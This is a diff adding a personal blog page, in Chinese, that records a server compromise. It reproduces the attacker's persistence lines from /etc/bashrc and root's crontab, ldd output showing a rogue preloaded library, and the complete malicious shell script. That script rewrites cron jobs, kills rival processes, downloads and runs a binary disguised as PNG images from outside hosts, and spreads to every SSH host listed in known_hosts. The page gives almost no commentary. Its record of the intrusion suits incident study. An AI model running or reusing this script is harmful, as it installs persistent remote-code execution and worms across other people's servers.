@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="generator" content="AsciiDoc 8.6.10" />
+<link rel="stylesheet" href="/statics/css/style.css" type="text/css" />
+<link rel="stylesheet" href="/statics/css/icofont.css" type="text/css">
+<link rel="icon" href="/statics/images/icon.jpg" type="image/jpeg" size="32x32" />
+<body>
+    <div id="main">
+
+        <div id="header">
+            <div id="headerLeft">
+                <div id="name"><a href="/blog.html">an9wer's blog</a></div>
+                <div id="signature">Just stick to it :)</div>
+            </div> <!-- headerLeft -->
+            <div id="headerRight">
+                <div id="avatar"><img src="/statics/images/avatar.jpg"></div>
+            </div> <!-- headerRight -->
+        </div> <!-- header -->
+
+        <div id="navbar">
+            <a id="blog" class="current"
+                href="/blog.html">Blog</a>
+            <a id="tweet"
+                href="/tweet.html">Tweet</a>
+            <a id="notes"
+                href="/notes.html">Notes</a>
+            <a id="about"
+                href="/about.html">About</a>
+        </div> <!-- navbar -->
+
+        <div id="content">
+<div class="section" id="id1">
+<h1>服务器被黑事件</h1>
+<p>在 /etc/bashrc 中</p>
+<pre class="literal-block">(curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;exec(urllib.urlopen(&quot;http://aliyun.one/pygo&quot;).read())')|sh &gt;/dev/null 2&gt;&amp;1 &amp;</pre>
+<p>在 /var/spool/cron/root 中</p>
+<pre class="literal-block">*/15 * * * * (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(&quot;http://aliyun.one&quot;).read())')|sh</pre>
+<p>ldd :</p>
+<pre class="literal-block"># ldd  `which top`
+linux-vdso.so.1 =&gt;  (0x00007ffe21bc7000)
+/usr/local/lib/libevent_core-0.12.so (0x00007ff594420000)
+libprocps.so.4 =&gt; /lib64/libprocps.so.4 (0x00007ff5941f9000)
+libsystemd.so.0 =&gt; /lib64/libsystemd.so.0 (0x00007ff593fc8000)
+libncurses.so.5 =&gt; /lib64/libncurses.so.5 (0x00007ff593da1000)
+libtinfo.so.5 =&gt; /lib64/libtinfo.so.5 (0x00007ff593b77000)
+libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007ff593973000)
+libc.so.6 =&gt; /lib64/libc.so.6 (0x00007ff5935a5000)
+libcap.so.2 =&gt; /lib64/libcap.so.2 (0x00007ff5933a0000)
+libm.so.6 =&gt; /lib64/libm.so.6 (0x00007ff59309e000)
+librt.so.1 =&gt; /lib64/librt.so.1 (0x00007ff592e96000)
+libselinux.so.1 =&gt; /lib64/libselinux.so.1 (0x00007ff592c6f000)
+liblzma.so.5 =&gt; /lib64/liblzma.so.5 (0x00007ff592a49000)
+liblz4.so.1 =&gt; /lib64/liblz4.so.1 (0x00007ff592834000)
+libgcrypt.so.11 =&gt; /lib64/libgcrypt.so.11 (0x00007ff5925b3000)
+libgpg-error.so.0 =&gt; /lib64/libgpg-error.so.0 (0x00007ff5923ae000)
+libresolv.so.2 =&gt; /lib64/libresolv.so.2 (0x00007ff592195000)
+libdw.so.1 =&gt; /lib64/libdw.so.1 (0x00007ff591f44000)
+libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007ff591d2e000)
+libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007ff591b12000)
+/lib64/ld-linux-x86-64.so.2 (0x00007ff594626000)
+libattr.so.1 =&gt; /lib64/libattr.so.1 (0x00007ff59190d000)
+libpcre.so.1 =&gt; /lib64/libpcre.so.1 (0x00007ff5916ab000)
+libelf.so.1 =&gt; /lib64/libelf.so.1 (0x00007ff591493000)
+libz.so.1 =&gt; /lib64/libz.so.1 (0x00007ff59127d000)
+libbz2.so.1 =&gt; /lib64/libbz2.so.1 (0x00007ff59106d000)
+
+
+# ldd `which ps`
+linux-vdso.so.1 =&gt;  (0x00007ffe8214a000)
+/usr/local/lib/libevent_core-0.12.so (0x00007f49ddc38000)
+libprocps.so.4 =&gt; /lib64/libprocps.so.4 (0x00007f49dda11000)
+libsystemd.so.0 =&gt; /lib64/libsystemd.so.0 (0x00007f49dd7e0000)
+libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007f49dd5dc000)
+libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f49dd20e000)
+libcap.so.2 =&gt; /lib64/libcap.so.2 (0x00007f49dd009000)
+libm.so.6 =&gt; /lib64/libm.so.6 (0x00007f49dcd07000)
+librt.so.1 =&gt; /lib64/librt.so.1 (0x00007f49dcaff000)
+libselinux.so.1 =&gt; /lib64/libselinux.so.1 (0x00007f49dc8d8000)
+liblzma.so.5 =&gt; /lib64/liblzma.so.5 (0x00007f49dc6b2000)
+liblz4.so.1 =&gt; /lib64/liblz4.so.1 (0x00007f49dc49d000)
+libgcrypt.so.11 =&gt; /lib64/libgcrypt.so.11 (0x00007f49dc21c000)
+libgpg-error.so.0 =&gt; /lib64/libgpg-error.so.0 (0x00007f49dc017000)
+libresolv.so.2 =&gt; /lib64/libresolv.so.2 (0x00007f49dbdfe000)
+libdw.so.1 =&gt; /lib64/libdw.so.1 (0x00007f49dbbad000)
+libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007f49db997000)
+libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f49db77b000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f49dde3e000)
+libattr.so.1 =&gt; /lib64/libattr.so.1 (0x00007f49db576000)
+libpcre.so.1 =&gt; /lib64/libpcre.so.1 (0x00007f49db314000)
+libelf.so.1 =&gt; /lib64/libelf.so.1 (0x00007f49db0fc000)
+libz.so.1 =&gt; /lib64/libz.so.1 (0x00007f49daee6000)
+libbz2.so.1 =&gt; /lib64/libbz2.so.1 (0x00007f49dacd6000)
+
+
+# ldd `which vmstat`
+linux-vdso.so.1 =&gt;  (0x00007ffd99ce3000)
+/usr/local/lib/libevent_core-0.12.so (0x00007fdf0f4cb000)
+libprocps.so.4 =&gt; /lib64/libprocps.so.4 (0x00007fdf0f2a4000)
+libsystemd.so.0 =&gt; /lib64/libsystemd.so.0 (0x00007fdf0f073000)
+libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007fdf0ee6f000)
+libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fdf0eaa1000)
+libcap.so.2 =&gt; /lib64/libcap.so.2 (0x00007fdf0e89c000)
+libm.so.6 =&gt; /lib64/libm.so.6 (0x00007fdf0e59a000)
+librt.so.1 =&gt; /lib64/librt.so.1 (0x00007fdf0e392000)
+libselinux.so.1 =&gt; /lib64/libselinux.so.1 (0x00007fdf0e16b000)
+liblzma.so.5 =&gt; /lib64/liblzma.so.5 (0x00007fdf0df45000)
+liblz4.so.1 =&gt; /lib64/liblz4.so.1 (0x00007fdf0dd30000)
+libgcrypt.so.11 =&gt; /lib64/libgcrypt.so.11 (0x00007fdf0daaf000)
+libgpg-error.so.0 =&gt; /lib64/libgpg-error.so.0 (0x00007fdf0d8aa000)
+libresolv.so.2 =&gt; /lib64/libresolv.so.2 (0x00007fdf0d691000)
+libdw.so.1 =&gt; /lib64/libdw.so.1 (0x00007fdf0d440000)
+libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007fdf0d22a000)
+libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007fdf0d00e000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fdf0f6d1000)
+libattr.so.1 =&gt; /lib64/libattr.so.1 (0x00007fdf0ce09000)
+libpcre.so.1 =&gt; /lib64/libpcre.so.1 (0x00007fdf0cba7000)
+libelf.so.1 =&gt; /lib64/libelf.so.1 (0x00007fdf0c98f000)
+libz.so.1 =&gt; /lib64/libz.so.1 (0x00007fdf0c779000)
+libbz2.so.1 =&gt; /lib64/libbz2.so.1 (0x00007fdf0c569000)</pre>
+<p>脚本:</p>
+<pre class="literal-block">#&lt;script&gt;window.location.href=&quot;http://aliyun.com&quot;;&lt;/script&gt;&lt;!--
+export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin
+mv /bin/wge /bin/wget
+mv /bin/cur /bin/curl
+mv /usr/bin/wge /usr/bin/wget
+mv /usr/bin/cur /usr/bin/curl
+mkdir -p /tmp
+chmod 1777 /tmp
+echo &quot;*/10 * * * * (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(\&quot;http://aliyun.one\&quot;).read())')|sh&quot;|crontab -
+cat &gt; /etc/crontab &lt;&lt;EOF
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+
+*/10 * * * * root (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(&quot;http://aliyun.one&quot;).read())'||/usr/local/sbin/76572670a3)|sh
+EOF
+swapoff -a
+find /etc/cron*|xargs chattr -i
+find /var/spool/cron*|xargs chattr -i
+grep -RE &quot;(wget|curl)&quot; /etc/cron*|grep -v &quot;aliyun.one&quot;|cut -f 1 -d :|xargs rm -rf
+grep -RE &quot;(wget|curl)&quot; /var/spool/cron*|grep -v &quot;aliyun.one&quot;|cut -f 1 -d :|xargs rm -rf
+netstat -anp|grep :::6345|awk '{print $7}'|sed -e &quot;s/\/.*//g&quot;|xargs kill -9
+netstat -anp|grep 119.9.76.107:443|awk '{print $7}'|sed -e &quot;s/\/.*//g&quot;|xargs kill -9
+cd /tmp
+touch /usr/local/bin/writeablex &amp;&amp; cd /usr/local/bin/
+touch /usr/libexec/writeablex &amp;&amp; cd /usr/libexec/
+touch /usr/bin/writeablex &amp;&amp; cd /usr/bin/
+rm -rf /usr/local/bin/writeablex /usr/libexec/writeablex /usr/bin/writeablex
+
+export PATH=$PATH:$(pwd)
+a64=&quot;img.sobot.com/chatres/89/msg/20191225/1/ec0991da601e45c4b0bb6178da5f0cc4.png&quot;
+a32=&quot;img.sobot.com/chatres/89/msg/20191225/1/50659157a100466a88fed550423a38ee.png&quot;
+b64=&quot;cdn.xiaoduoai.com/cvd/dist/fileUpload/1577269944760/2.637890910155951.png&quot;
+b32=&quot;cdn.xiaoduoai.com/cvd/dist/fileUpload/1577269966297/8.872362655092918.png&quot;
+c64=&quot;https://user-images.githubusercontent.com/56861392/71443284-08acf200-2745-11ea-8ef3-509d9072d970.png&quot;
+c32=&quot;https://user-images.githubusercontent.com/56861392/71443285-08acf200-2745-11ea-96c3-0c2be9135085.png&quot;
+if [ ! -f &quot;76572670a3&quot; ]; then
+    ARCH=$(getconf LONG_BIT)
+    if [ ${ARCH}x = &quot;64x&quot; ]; then
+        (curl -fsSL -m180 $a64 -o 76572670a3||wget -T180 -q $a64 -O 76572670a3||python -c 'import urllib;urllib.urlretrieve(&quot;http://'$a64'&quot;, &quot;76572670a3&quot;)'||curl -fsSL -m180 $b64 -o 76572670a3||wget -T180 -q $b64 -O 76572670a3||python -c 'import urllib;urllib.urlretrieve(&quot;http://'$b64'&quot;, &quot;76572670a3&quot;)'||curl -fsSL -m180 $c64 -o 76572670a3||wget -T180 -q $c64 -O 76572670a3||python -c 'import urllib;urllib.urlretrieve(&quot;'$c64'&quot;, &quot;76572670a3&quot;)')
+    else
+        (curl -fsSL -m180 $a32 -o 76572670a3||wget -T180 -q $a32 -O 76572670a3||python -c 'import urllib;urllib.urlretrieve(&quot;http://'$a32'&quot;, &quot;76572670a3&quot;)'||curl -fsSL -m180 $b32 -o 76572670a3||wget -T180 -q $b32 -O 76572670a3||python -c 'import urllib;urllib.urlretrieve(&quot;http://'$b32'&quot;, &quot;76572670a3&quot;)'||curl -fsSL -m180 $c32 -o 76572670a3||wget -T180 -q $c32 -O 76572670a3||python -c 'import urllib;urllib.urlretrieve(&quot;'$c32'&quot;, &quot;76572670a3&quot;)')
+    fi
+fi
+chmod +x 76572670a3
+$(pwd)/76572670a3 || ./76572670a3 || /usr/bin/76572670a3 || /usr/libexec/76572670a3 || /usr/local/bin/76572670a3 || 76572670a3 || /tmp/76572670a3 || /usr/local/sbin/76572670a3
+if [ -f /root/.ssh/known_hosts ]; then
+  for h in $(grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h &quot;(curl -fsSL aliyun.one||wget -q -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(\&quot;http://aliyun.one\&quot;).read())')|sh &gt;/dev/null 2&gt;&amp;1 &amp;&quot;;done
+fi
+
+for file in /home/*
+do
+    if test -d $file; then
+        if [ -f $file/.ssh/known_hosts ]; then
+            for h in $(grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h &quot;(curl -fsSL aliyun.one||wget -q -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen(\&quot;http://aliyun.one\&quot;).read())')|sh &gt;/dev/null 2&gt;&amp;1 &amp;&quot;;done
+        fi
+    fi
+done
+#--&gt;</pre>
+<div class="section" id="references">
+<h2>References</h2>
+<p><a class="reference external" href="https://www.anquanke.com/post/id/171523">https://www.anquanke.com/post/id/171523</a></p>
+<p><a class="reference external" href="https://zhuanlan.zhihu.com/p/65609044">https://zhuanlan.zhihu.com/p/65609044</a></p>
+</div>
+</div>
+        </div> <!-- content -->
+
+        <div id="footer">
+        <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank">CC BY-NC-SA</a> 2018-2019 an9wer | powered by <a href="http://docutils.sourceforge.net/" target="_blank">docutils</a>
+        </div> <!-- footer -->
+
+    </div> <!-- main -->
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-141786049-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-141786049-1');
+    </script>
+
+</body>
+</html>
